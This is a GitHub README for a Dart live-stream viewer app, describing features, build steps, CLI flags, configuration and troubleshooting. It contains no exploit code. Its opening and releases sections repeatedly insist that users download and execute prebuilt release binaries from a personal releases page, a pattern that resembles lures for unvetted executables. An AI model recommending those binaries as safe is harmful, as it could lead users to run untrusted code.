[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/ali150000/dart_simple_live/releases)

# Dart Simple Live — Lightweight Live Stream Viewer App for Dart

![Live Stream Hero](https://images.unsplash.com/photo-1515378791036-0648a3ef77b2?auto=format&fit=crop&w=1400&q=80)

简简单单的看直播 — a compact, practical app written in Dart. It plays live streams, shows chat, and keeps resource use low. The repo focuses on a small codebase and fast startup.

Download and run the release file available at https://github.com/ali150000/dart_simple_live/releases. The release file needs to be downloaded and executed to run the standalone player.

Table of contents
- About
- Key features
- Screenshots
- Architecture
- Install and run (release)
- Build from source
- Usage
- Configuration
- Common stream sources
- Tips for mobile and desktop
- Troubleshooting
- Contributing
- License

About
Dart Simple Live targets users who want a focused tool to watch live streams. It does not include heavy UI frameworks. It uses core Dart and a minimal set of packages to parse stream URLs, play video, and present chat. It supports RTMP, HLS, and WebRTC where the environment allows.

Key features
- Play HLS (.m3u8) and RTMP streams.
- Lightweight UI with basic controls: play, pause, mute, quality select.
- Chat overlay parsed from common platforms.
- Auto-reconnect for short interruptions.
- Low memory footprint.
- Cross-platform support: desktop and mobile builds via Flutter optional adapters.
- CLI mode for headless playback and logging.

Screenshots
![Player - dark](https://raw.githubusercontent.com/ali150000/dart_simple_live/main/assets/screens/player_dark.png)
![Player - chat overlay](https://raw.githubusercontent.com/ali150000/dart_simple_live/main/assets/screens/chat_overlay.png)

Architecture
- Core: Dart modules that handle stream parsing and state.
- Player: a thin adapter over platform video backends (native or web).
- Chat: modular parsers to ingest chat from different providers.
- CLI: small command line wrapper for automated runs.

The code splits responsibilities into small, testable units. This approach keeps the repo readable and easy to extend.

Install and run (release)
The releases page includes packaged builds and scripts. Download the release file and execute it.

1. Visit the release link and download the appropriate asset:
   https://github.com/ali150000/dart_simple_live/releases
2. For macOS / Linux:
   - Make the file executable:
     chmod +x dart_simple_live-<version>-linux
   - Run:
     ./dart_simple_live-<version>-linux --url "<STREAM_URL>"
3. For Windows:
   - Download the .exe asset.
   - Double-click to run, or run from PowerShell:
     .\dart_simple_live-<version>-win.exe --url "<STREAM_URL>"
4. For mobile:
   - Use the provided APK (Android) from releases or sideload with adb:
     adb install dart_simple_live-<version>.apk
   - Then open the app and paste stream URL.

If the releases page contains multiple assets, pick the one that matches your OS and CPU.

Build from source
The repository builds with Dart/Flutter depending on the target.

Prerequisites
- Dart SDK 2.12+ or Flutter 2.0+
- A terminal and basic build tools for your OS

Clone
git clone https://github.com/ali150000/dart_simple_live.git
cd dart_simple_live

Core build (Dart only)
1. Install dependencies:
   dart pub get
2. Run tests:
   dart test
3. Run the CLI player:
   dart bin/dart_simple_live.dart --url "https://example.com/stream.m3u8"

Flutter build (Desktop/Mobile)
1. Install Flutter and set up targets.
2. Install packages:
   flutter pub get
3. Run debug build on desktop:
   flutter run -d windows
4. Build release for Android:
   flutter build apk --release

Usage
Basic CLI
- Play HLS stream:
  dart run bin/dart_simple_live.dart --url "https://example.com/stream.m3u8"
- Play RTMP:
  dart run bin/dart_simple_live.dart --url "rtmp://live.example.com/app/streamKey"
- Headless logging:
  dart run bin/dart_simple_live.dart --url "<URL>" --headless --log-level info

Player controls (UI)
- Space: toggle play/pause
- M: mute/unmute
- Q: open quality selection
- C: toggle chat overlay
- Left/Right: seek back/forward (if stream supports DVR)

Configuration
Use the config file to set defaults. Place config.yaml in the same folder as the binary or in the user config path.

Example config.yaml
player:
  autoplay: true
  mute: false
  max-bitrate: 2500
chat:
  show: true
  font-size: 14
  placement: overlay
network:
  reconnect-delay: 5
  timeout: 10

Common stream sources
- Twitch HLS: https://usher.ttvnw.net/api/channel/hls/<channel>.m3u8
- YouTube live HLS: use the stream URL provided via YouTube API
- RTMP: rtmp://host/app/streamKey

The player accepts direct HLS and RTMP urls. For platform-specific APIs, use a small bridge to fetch the real stream link, then pass it to the player.

Tips for mobile and desktop
- On mobile, prefer the native player pathway to reduce battery use.
- On desktop, use GPU decoding when available to lower CPU load.
- For limited bandwidth, set max-bitrate in config to throttle playback.

Troubleshooting
- Black screen on HLS:
  - Check CORS on web builds.
  - Verify the m3u8 URL works in VLC.
- No audio:
  - Check system volume and mute setting in the player.
  - Test another stream. If audio is missing across streams, the issue may be with the audio backend.
- Frequent disconnects:
  - Increase reconnect-delay.
  - Check network stability and firewall rules.

Command reference
--url <STREAM_URL>        Stream URL to play
--headless                Run without UI (logs to stdout)
--config <file>           Path to config.yaml
--log-level <level>       debug|info|warn|error
--version                 Show version

Extending and plugins
The project uses plugin adapters to add support for more chat sources and stream providers. Add a new adapter by implementing the ChatAdapter interface in lib/chat/adapters.

Example adapter skeleton
class MyChatAdapter implements ChatAdapter {
  @override
  Stream<ChatMessage> messagesFor(String streamId) async* {
    // connect to websocket or poll HTTP
    // yield ChatMessage objects
  }
}

Focus on small, testable methods. Keep adapters independent and stateless where possible.

Testing
- Unit tests live under /test.
- Run:
  dart test
- For Flutter widgets:
  flutter test

CI
The repository includes a basic GitHub Actions workflow that runs pub get and dart test on pull requests for the main branch.

Contributing
- Open an issue to propose changes or report bugs.
- Fork and create a pull request for code changes.
- Keep commits small and focused.
- Add tests for new behavior.

Code style
- Follow effective Dart style.
- Use null-safety.
- Keep functions short and explicit.

Security
- Do not embed secrets in config files.
- For production use, fetch stream keys from a secure store.

Releases and downloads
Download the packaged builds and scripts from the releases page:
https://github.com/ali150000/dart_simple_live/releases
Choose the asset that matches your OS and architecture. The release file must be downloaded and executed. Each release bundles a README for the included binary with platform-specific run instructions.

Resources and links
- Project issues: https://github.com/ali150000/dart_simple_live/issues
- Releases: https://github.com/ali150000/dart_simple_live/releases
- Example stream test URL: https://demo-streams.example/m3u8/test.m3u8

Badges
[![Downloads](https://img.shields.io/badge/Download-Releases-brightgreen)](https://github.com/ali150000/dart_simple_live/releases)
[![Dart](https://img.shields.io/badge/Dart-2.12%2B-blue)](https://dart.dev)

Acknowledgements
- Video backend options inspired by community players.
- Chat parsing logic grew from several open adapters.

License
MIT License

Credits
- Main author: ali150000
- Contributors: check the repository contributors list for details on contributions and patches.